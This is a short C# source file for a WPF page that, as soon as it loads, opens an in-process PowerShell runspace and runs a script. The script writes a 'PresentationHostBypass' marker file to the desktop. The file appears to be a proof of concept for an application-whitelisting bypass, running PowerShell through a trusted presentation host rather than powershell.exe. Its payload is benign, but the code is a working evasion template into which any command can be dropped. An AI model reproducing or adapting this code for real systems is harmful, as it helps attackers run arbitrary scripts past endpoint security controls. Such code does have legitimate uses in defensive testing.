using System.Windows;
using System.Windows.Controls;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace powershell
{
    public partial class Page1 : Page
    {
        public Page1()
        {
            InitializeComponent();
            Execute();
        }
        private void Execute()
        {
            string command = "$DesktopPath = [Environment]::GetFolderPath('Desktop');echo PresentationHostBypass >> $DesktopPath\\WLtester.txt;";
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.InvokeAsync();
        }
    }
}
